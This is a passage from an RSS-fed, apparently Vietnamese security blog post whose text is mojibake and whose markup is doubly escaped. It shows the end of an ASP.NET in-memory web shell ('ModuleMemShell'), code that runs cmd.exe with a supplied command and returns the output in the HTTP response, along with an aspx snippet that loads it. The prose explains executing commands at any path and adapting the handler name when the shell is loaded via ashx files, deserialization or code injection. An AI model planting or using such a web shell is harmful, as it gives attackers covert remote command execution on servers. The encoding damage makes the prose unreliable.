&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FileName&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Arguments&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;/c&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UseShellExecute&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RedirectStandardError&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UTF8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StandardOutput&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StandardError&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Default&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;&amp;lt;%&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ModuleMemShell&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;%&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Cuá»‘i cÃ¹ng lÃ  exec command táº¡i Ä‘Æ°á»ng dáº«n báº¥t ká»³:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJBS9psS-g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ³ má»™t lÆ°u Ã½ nhÆ° sau: Khi load memshell nÃ y báº±ng file ashx hoáº·c deser, code inject thÃ¬ cáº§n sá»­a Ä‘á»•i handler_name cho phÃ¹ há»£p Ä‘á»ƒ code mÃ¬nh cÃ³ thá»ƒ xÃ³a Ä‘Æ°á»£c Ä‘Ãºng event, táº¡i Ä‘Ã¢y mÃ¬nh Ä‘ang vÃ­ dá»¥ load memshell code báº±ng file aspx.&lt;/p&gt;</description></item></channel></rss>